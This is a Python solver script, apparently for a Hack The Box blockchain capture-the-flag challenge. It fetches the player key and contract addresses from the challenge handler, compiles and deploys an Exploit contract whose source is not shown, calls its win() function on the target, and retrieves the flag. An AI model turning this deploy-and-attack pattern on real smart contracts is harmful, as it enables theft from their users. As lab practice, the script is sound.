#!/usr/bin/env python3

import solcx
from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)


if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    player_account = Account.from_key(player_pvk)
    print(f"[+] Player Address: {player_account.address}")
    print(f"[+] Setup Contract Address: {setup_addr}")
    print(f"[+] Target Contract Address: {target_addr}")
    
    with open("contracts/out/Exploit.sol/Exploit.json") as f:
        exploit_code = f.read()

    print("[*] Compiling exploit contracts...")
    solc_version = solcx.install_solc(version="0.8.28", show_progress=True)
    solcx.set_solc_version(solc_version)
    
    exploit_compiled = solcx.compile_files(
        ["contracts/src/Exploit.sol"],
        output_values=["abi", "bin"]
    )["contracts/src/Exploit.sol:Exploit"]

    exploit_abi = exploit_compiled["abi"]
    exploit_bytecode = exploit_compiled["bin"]

    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")

    # deploy exploit contract
    Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode)
    try:
        deploy_tx = Exploit.constructor().build_transaction({
                'from': player_account.address,
                'nonce': w3.eth.get_transaction_count(player_account.address)
        })
        tx_hash_deploy = w3.eth.send_transaction(deploy_tx)
        print(f"    [>] Sent deploy exploit contract transaction: 0x{tx_hash_deploy.hex()}")
        rcpt_deploy = w3.eth.wait_for_transaction_receipt(tx_hash_deploy)
        print(f"    [>] Deploy exploit contract transaction mined. Status: {rcpt_deploy.status}")
        exploit_addr = rcpt_deploy.contractAddress
        print(f"    [>] Exploit contract deployed at: {exploit_addr}")
    except Exception as e:
        print(f"[!] Failed to send deploy exploit contract transaction: {e}")

    # call win function
    exploit_contract = w3.eth.contract(address=exploit_addr, abi=exploit_abi)
    try:
        tx_hash_win = exploit_contract.functions.win(target_addr).build_transaction({
            'from': player_account.address,
            'nonce': w3.eth.get_transaction_count(player_account.address)
        })
        tx_hash_win = w3.eth.send_transaction(tx_hash_win)
        print(f"    [>] Sent win transaction: 0x{tx_hash_win.hex()}")
        rcpt_win = w3.eth.wait_for_transaction_receipt(tx_hash_win)
        print(f"    [>] Win transaction mined. Status: {rcpt_win.status}")
    except Exception as e:
        print(f"[!] Failed to send win transaction")

    ### get flag ###
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    